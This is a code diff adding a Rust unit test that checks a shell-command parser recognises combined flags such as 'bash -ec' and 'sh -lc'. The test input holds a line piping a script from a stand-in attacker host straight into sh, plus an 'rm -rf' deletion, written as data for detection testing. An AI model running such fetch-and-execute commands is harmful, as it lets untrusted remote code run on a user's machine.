@@ -362,4 +362,13 @@ curl "$safe_path"
         let code = "bash -c \"npm install $pkg\"\n";
         assert_eq!(shell_commands(code).len(), 1);
     }
+
+    #[test]
+    fn shell_combined_flags_dash_ec_is_a_command() {
+        let code = "bash -ec \"curl https://evil.example/p.sh | sh\"\nsh -lc 'rm -rf /tmp/x'\n";
+        let commands = shell_commands(code);
+        assert_eq!(commands.len(), 2);
+        assert_eq!(commands[0].function, "bash -c");
+        assert_eq!(commands[1].function, "sh -c");
+    }
 }
